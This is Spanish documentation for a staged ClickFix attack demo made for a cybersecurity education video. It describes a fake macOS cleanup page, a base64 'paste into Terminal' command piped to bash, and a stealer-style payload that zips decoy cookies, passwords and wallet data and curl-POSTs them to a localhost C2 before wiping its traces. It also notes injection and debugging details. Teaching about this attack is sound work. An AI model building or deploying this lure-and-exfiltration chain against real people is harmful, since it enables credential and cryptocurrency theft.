# 05 — La demo ClickFix v2 (exfiltración) — documentación completa

## Qué es

Demostración del ataque **ClickFix** para video educativo de ciberseguridad:
una página falsa de "limpieza de Mac" convence a la víctima de pegar un comando
en Terminal → el comando roba datos → los exfiltra a un servidor del "atacante"
(Python en localhost) → la víctima solo ve "✓ todo protegido".

**100% ético y controlado:**
- Los "datos robados" son DECOYS falsos creados para el video (cookies, contraseñas
  y wallet ficticios de un personaje inventado "mario.delacruz@gmail.com")
- La exfiltración va SOLO a `127.0.0.1:4444` (localhost) — nada sale del Mac
- Sin red externa, sin datos reales del usuario, sin persistencia (v2 no instala nada)

## Arquitectura (4 piezas)

```
~/Desktop/clickfix-demo/
├── fake-page.html        ← página del señuelo (Safari la muestra)
│                            contiene: comando base64 inyectado en el JS const CMD
├── payload2.sh           ← el malware demo (lo que decodifica el comando)
├── payload2_b64.txt       ← payload2.sh codificado en base64
├── c2_server.py           ← servidor del "atacante" (recibe y muestra el botín)
├── victim-data/           ← datos DECOY de la víctima
│   ├── Chrome_Cookies.txt     (14 cookies falsas: Gmail, PayPal, banco...)
│   ├── Chrome_Passwords.txt   (6 contraseñas falsas en texto plano)
│   └── wallet.dat             (wallet Electrum falsa, bytes aleatorios)
├── c2_loot/               ← aquí guarda el C2 los zips recibidos
└── (v1, ya retirada) beacon.sh — demo de persistencia con LaunchAgent
```

## El flujo del ataque (lo que se grabó)

1. **Señuelo:** Safari muestra "3 amenazas detectadas" + pasos 1-2-3
   + botón rojo "COPIAR COMANDO DE LIMPIEZA (⌘C)"
2. **La víctima copia:** clic en el botón → JS carga el portapapeles con:
   `echo '<BASE64_DE_PAYLOAD2>' | base64 -d | bash` (1982 chars)
   → el botón se vuelve verde "¡COMANDO COPIADO!"
3. **La víctima pega en Terminal:** ⌘V — pared de base64 ilegible → Enter
4. **PAYLOAD (estilo AMOS real):**
   - Distracción: barra de progreso "limpieza del sistema" (~1.7s)
   - FASE SILENCIOSA: copia los decoys + info del sistema (whoami, hostname, sw_vers)
   - Empaqueta en zip → `curl -X POST` a `http://127.0.0.1:4444/upload`
   - Borra sus rastros (temp dir + zip)
   - Mintira final: "Limpieza completada. Tu Mac está protegido. ✓"
5. **El C2 del atacante INUNDA su panel:**
   - VÍCTIMA CONECTADA → zip guardado → archivos listados
   - COOKIES (14 en amarillo) → PASSWORDS (6 en texto plano) → WALLET → INFO
   - "EXFILTRACIÓN COMPLETA — datos listos para vender"

## Lección pedagógica (la que el usuario cuenta con su voz)

ClickFix NO hackea nada: **convierte a la víctima en el ejecutor del ataque**.
- macOS no detecta nada malicioso (el usuario ejecutó un comando "voluntariamente")
- La "limpieza" era teatro para que la víctima no mire mientras se roba todo
- Así funciona Atomic macOS Stealer (AMOS) real en campañas ClickFix 2024-2025

## Bugs encontrados y cómo evitarlos

### 1. El bug de la comilla comida (re.sub)
**Síntoma:** el comando pegado no ejecutaba; regex de verificación no encontraba nada.
**Causa:** un `re.sub` cuyo patrón consumía `'` final pero el reemplazo no lo devolvía:
```python
# MAL: el patrón se come la comilla y el reemplazo no la repone
re.sub(r"const CMD = \"echo '[A-Za-z0-9+/=]+'", "const CMD = \"echo '" + nuevo, ...)
# BIEN: capturar las comillas como grupos y reinsertarlas
re.subn(r"(const CMD = \"echo ')[A-Za-z0-9+/=]+(' \| base64 -d \| bash\")",
        lambda m: m.group(1) + nuevo + m.group(2), html, count=1)
```
**Lección:** SIEMPRE verificar tras inyectar: decodificar el base64 del HTML y
comparar con el archivo original del payload (verify2.py).

### 2. Printf con %% doble
`printf "%d%%%%"` imprime `4%%` (doble). Correcto: `%d%%` → `4%`.
Solo se nota en tty (el log no-tty muestra ambas líneas).

### 3. Terminal "front window" race
Ver doc 03 lección 3 — posicionar por ID SIEMPRE.

### 4. El paste puede caer en la ventana equivocada
Ver doc 03 lección 7 (usuario tocó el Mac → paste al TUI). Protocolo de toma única.
